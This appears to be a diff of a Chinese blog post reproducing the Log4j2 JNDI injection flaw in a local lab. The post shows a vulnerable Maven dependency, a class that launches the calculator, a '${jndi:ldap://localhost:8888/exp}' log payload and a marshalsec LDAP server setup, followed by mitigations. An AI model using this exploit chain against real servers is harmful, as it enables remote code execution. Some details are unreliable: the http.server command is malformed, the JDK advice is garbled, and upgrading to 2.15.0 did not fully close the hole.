@@ -11,7 +11,7 @@
   <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-  <title>log4j2漏洞复现 | wh1t3zer</title>
+  <title>Log4j2漏洞复现 | wh1t3zer</title>
 
   <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
   <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
@@ -495,6 +495,81 @@
       </ul>
       
       
+        <div id="appSearch">
+  <div class="search"  @click="showDialog()"><i class="fas fa-search" aria-hidden="true"></i></div>
+  <transition name="fade">
+    <div class="message-box_wrapper" style="display: none;" v-cloak v-show="dialogVisible" @click.self="cancelDialogVisible()">
+      <div class="message-box animated bounceInDown">
+        <h2>
+          <span>
+            <i class="fas fa-search" aria-hidden="true"></i>
+            <span class="title">Search</span>
+          </span>
+          <i class="fas fa-times close" pointer style="float:right;" aria-hidden="true" @click.self="cancelDialogVisible()"></i>
+        </h2>
+        <form class="site-search-form">
+          <input type="text"
+            placeholder="Please enter keywords"
+            id="local-search-input" 
+            @click="getSearchFile()"
+            class="st-search-input"
+            v-model="searchInput"
+          />
+        </form>
+        <div class="result-wrapper">
+          <div id="local-search-result" class="local-search-result-cls"></div>
+        </div>
+      </div>
+    </div>
+  </transition>
+</div>
+<script src="/js/local_search.js"></script>
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appSearch',
+    data: {
+      dialogVisible: false,
+      searchInput: '',
+      top: 0,
+    },
+    computed: {
+    },
+    mounted() {
+      window.addEventListener('pjax:complete', () => {
+        this.cancelDialogVisible();
+      })
+    },
+    methods: {
+      showDialog() {
+        this.dialogVisible = true;
+        // 防止页面滚动，只能让弹框滚动
+        this.top = $(document).scrollTop()
+        body.style.cssText = 'overflow: hidden;';
+      },
+      getSearchFile() {
+        if (!this.searchInput) {
+          getSearchFile("/search.xml");
+        }
+      },
+      cancelDialogVisible() {
+        this.dialogVisible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      },
+    },
+    created() {}
+  })
+</script>
+<!-- 解决刷新页面闪烁问题，可以在元素上添加display: none, 或者用vue.extend方法，详情：https://blog.csdn.net/qq_31393401/article/details/81017912 -->
+<!-- 下面是搜索基本写法 -->
+<!-- <script type="text/javascript" id="local.search.active">
+  var inputArea = document.querySelector("#local-search-input");
+  inputArea.onclick   = function(){ getSearchFile(); this.onclick = null }
+  inputArea.onkeydown = function(){ if(event.keyCode == 13) return false }
+</script> -->
+
+      
 
     </nav>
   </div>
@@ -518,14 +593,14 @@
 
 
 <div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
-  background-position: center center;position: relative;background-image:url('/medias/15.jpg')">
+  background-position: center center;position: relative;background-image:url('/medias/11.jpg')">
   <div class="post-detail-header-mask"></div>
   <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
   
   <div class="post-detail-header_info-box">
     <div class="title-box">
       <span class="title">
-        log4j2漏洞复现
+        Log4j2漏洞复现
       </span>
     </div>
     
@@ -567,15 +642,42 @@
       <div class="post-content">
         <h2 id="0x00简介"><a href="#0x00简介" class="headerlink" title="0x00简介"></a>0x00简介</h2><p>Apache Log4j2是一个优秀的java程序日志监控组件，提供了方便的日志记录。以前的java打印日志比较繁琐，常常使用system.err和system.out，这样一来会导致IO操作增加，输出的内容不能保存，无法定制日志格式等，于是有了log4j2日志组件。</p>
 <p>Log4j2与Log4j不是同一个东西，Log4j2借鉴了Slf4j和Logback，分为log4j-Api和log4j-core。log4j是CeKi Gulcu编写的，而log4j2是Apache独立推出的。</p>
-<h2 id="0x01影响范围"><a href="#0x01影响范围" class="headerlink" title="0x01影响范围"></a>0x01影响范围</h2><p>影响范围：Apache Log4j 2.x&lt;&#x3D;2.14.1。已知受影响的应用及组件，如 spring-boot-strater-log4j2 &#x2F; Apache Solr &#x2F; Apache Flink &#x2F; Apache Druid等。漏洞编号为CNVD-2021-95919，CVE-2021-44228。</p>
-<h2 id="0x02漏洞原理"><a href="#0x02漏洞原理" class="headerlink" title="0x02漏洞原理"></a>0x02漏洞原理</h2><h3 id="攻击流程图"><a href="#攻击流程图" class="headerlink" title="攻击流程图"></a>攻击流程图</h3><p>攻击者通过JNDI服务，执行LDAP协议注入恶意代码实现远程代码执行，</p>
-<h3 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h3><h4 id="JNDI服务"><a href="#JNDI服务" class="headerlink" title="JNDI服务"></a>JNDI服务</h4><p>首选我们了解一下JNDI服务是什么。JNDI全称为访问命名和目录服务的API，提供统一的客户端API。管理者将JNDI API映射为特定的命名服务和目录系统，使得JAVA应用可以和这些命名服务和目录服务之间进行交互。</p>
+<h2 id="0x01影响"><a href="#0x01影响" class="headerlink" title="0x01影响"></a>0x01影响</h2><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>Apache Log4j 2.x&lt;&#x3D;2.14.1。</p>
+<h3 id="受影响的应用及组件"><a href="#受影响的应用及组件" class="headerlink" title="受影响的应用及组件"></a>受影响的应用及组件</h3><p> spring-boot-strater-log4j2 </p>
+<p>Apache Solr</p>
+<p>Apache Flink </p>
+<p>Apache Druid</p>
+<p>漏洞编号为CNVD-2021-95919，CVE-2021-44228。</p>
+<h2 id="0x02漏洞原理"><a href="#0x02漏洞原理" class="headerlink" title="0x02漏洞原理"></a>0x02漏洞原理</h2><h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><p>攻击者在某些网站中的表单输入带有${}字样，服务器的log4j框架作为日志输出，但由于log4j存在漏洞，直接解析了${}，若{}内有攻击的命令，则会造成命令执行。解析后会先访问LDAP服务器，然后解析出我们需要的文件exp.java，并向HTTP服务器请求该文件，然后服务器在本地实例化exp.java并执行里面的exp类</p>
+<p>简化来说</p>
+<p>攻击者自身启动一台云服务器，并编写一个payload，里面带有${攻击者公网IP&#x2F;#文件名}，发送到受害者服务器，通过log4j漏洞，到LDAP服务器，并向攻击者公网服务器中请求攻击的文件，从该文件中实例化执行了里面的恶意类</p>
+<h3 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h3><p><img src="https://pic3.zhimg.com/80/v2-a4d74b24651715e7123fe77ee714fbfe_720w.webp" class="lazyload placeholder" data-srcset="https://pic3.zhimg.com/80/v2-a4d74b24651715e7123fe77ee714fbfe_720w.webp" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<h3 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h3><h4 id="JNDI服务"><a href="#JNDI服务" class="headerlink" title="JNDI服务"></a>JNDI服务</h4><p>JNDI全称为访问命名和目录服务的API，提供统一的客户端API。管理者将JNDI API映射为特定的命名服务和目录系统，使得JAVA应用可以和这些命名服务和目录服务之间进行交互。</p>
 <p>JNDI类似JDBC构建在抽象层，现在已经成为了J2EE的标准之一。</p>
-<h3 id="LADP协议"><a href="#LADP协议" class="headerlink" title="LADP协议"></a>LADP协议</h3><p>再来介绍一下LADP协议，全称是轻量级目录访问协议。它约定了客户端和服务端之间的信息交互格式使用的端口号认证方式等其他内容。如强大的AD(Active Directory)就是LDAP在Windows的实现。</p>
-<h2 id="0x02复现步骤"><a href="#0x02复现步骤" class="headerlink" title="0x02复现步骤"></a>0x02复现步骤</h2><h3 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h3><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><h2 id="0x03解决方法"><a href="#0x03解决方法" class="headerlink" title="0x03解决方法"></a>0x03解决方法</h2><p>1、禁用log4j的lookup功能</p>
-<p>2、禁用JNDI服务</p>
-<p>3、升级高版本jdk</p>
-<p>4、升级log4j版本</p>
+<h3 id="LADP协议"><a href="#LADP协议" class="headerlink" title="LADP协议"></a>LADP协议</h3><p>全称是轻量级目录访问协议。它约定了客户端和服务端之间的信息交互格式使用的端口号认证方式等其他内容。如强大的AD(Active Directory)就是LDAP在Windows的实现。</p>
+<h2 id="0x02复现步骤"><a href="#0x02复现步骤" class="headerlink" title="0x02复现步骤"></a>0x02复现步骤</h2><p>1、创建一个新的maven项目，并导入导致漏洞的Log4j2组件</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>2、编译一个恶意类exp，调用命令打开计算器</p>
+<p>javac exp.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">exp</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;calc&quot;</span>;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">exp</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">exp</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>3、编写一个poc.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">log4jTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        logger.error(<span class="string">&quot;$&#123;jndi:ldap://localhost:8888/exp&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>4、启动一个本地服务</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8888</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/wh1t3zer/recordCTF/main/imgs/202303261644116.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/wh1t3zer/recordCTF/main/imgs/202303261644116.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<p>5、启动本地LDAP服务</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone git<span class="meta">@github</span>.com:bkfish/Apache-Log4j-Learning.git</span><br><span class="line">cd Apache-Log4j-Learning/tools</span><br><span class="line">java -cp marshalsec-<span class="number">0.0</span><span class="number">.3</span>-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="string">&quot;http://127.0.0.1:8888/#exp&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03解决方法"><a href="#0x03解决方法" class="headerlink" title="0x03解决方法"></a>0x03解决方法</h2><h3 id="1、禁用log4j2的lookup功能"><a href="#1、禁用log4j2的lookup功能" class="headerlink" title="1、禁用log4j2的lookup功能"></a>1、禁用log4j2的lookup功能</h3><h4 id="设置日志输出-Pattern-格式"><a href="#设置日志输出-Pattern-格式" class="headerlink" title="设置日志输出 Pattern 格式"></a>设置日志输出 Pattern 格式</h4><p>对于 &gt;&#x3D;2.7 的版本，在 log4j 中对每一个日志输出格式进行修改。在 %msg 占位符后面添加 {nolookups}</p>
+<h4 id="设置JVM系统属性"><a href="#设置JVM系统属性" class="headerlink" title="设置JVM系统属性"></a>设置JVM系统属性</h4><p>在 Java 应用启动参数中增加 -Dlog4j2.formatMsgNoLookups&#x3D;true</p>
+<h4 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h4><p>在配置文件 log4j2.component.properties 中增加：log4j2.formatMsgNoLookups&#x3D;true，配置文件放置于应用程序的 ClassPath 路径下。</p>
+<h4 id="设置进程环境变量"><a href="#设置进程环境变量" class="headerlink" title="设置进程环境变量"></a>设置进程环境变量</h4><p>在环境变量中增加：LOG4J_FORMAT_MSG_NO_LOOKUPS&#x3D;true</p>
+<h3 id="2、禁用JNDI服务"><a href="#2、禁用JNDI服务" class="headerlink" title="2、禁用JNDI服务"></a>2、禁用JNDI服务</h3><h3 id="3、升级高版本jdk"><a href="#3、升级高版本jdk" class="headerlink" title="3、升级高版本jdk"></a>3、升级高版本jdk</h3><p>​	jdk超过1.8小于jdk8</p>
+<h3 id="4、升级log4j2版本"><a href="#4、升级log4j2版本" class="headerlink" title="4、升级log4j2版本"></a>4、升级log4j2版本</h3><p>​	将 log4j-core 升级到 2.15.0 版本</p>
 
       </div>
       <div class="post-tags-categories">
@@ -597,7 +699,7 @@
     </li>
     <li class="post-copyright-link">
     <strong>link:  </strong>
-    <a href="/2022/03/15/log4j漏洞复现/" target="_blank" title="log4j2漏洞复现">https://wh1t3zer.github.io/2022/03/15/log4j漏洞复现/</a>
+    <a href="/2022/03/15/log4j漏洞复现/" target="_blank" title="Log4j2漏洞复现">https://wh1t3zer.github.io/2022/03/15/log4j漏洞复现/</a>
     </li>
     <li class="post-copyright-license">
       <strong>Copyright notice:   </strong>
@@ -619,21 +721,16 @@
   <div class="post-nav-prev post-nav-item">
     <div class="post-nav-img" style="background-size: cover; 
       background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="/medias/14.jpg" class="lazyload placeholder" data-srcset="/medias/14.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="">
+      <img class="lazyload lazyload placeholder" src="/medias/7.jpg" class="lazyload placeholder" data-srcset="/medias/7.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="">
     </div>
-    <a href="/2022/08/20/%E5%90%91%E6%97%A5%E8%91%B5RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-nav-link">
+    <a href="/2022/03/26/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/" class="post-nav-link">
       <div class="title">
         <i class="fas fa-angle-left"></i> Prev:
-        <div class="title-text">向日葵RCE漏洞分析</div>
+        <div class="title-text">区块链安全问题</div>
       </div>
       
       <!-- <div class="content">
-        0x00漏洞范围
-个人版 ≤ V11.0.0.33
-
-简约版 ≤ V1.0.1.43315
-
-漏洞编号：CNVD-202
+        
       </div> -->
     </a>
   </div>
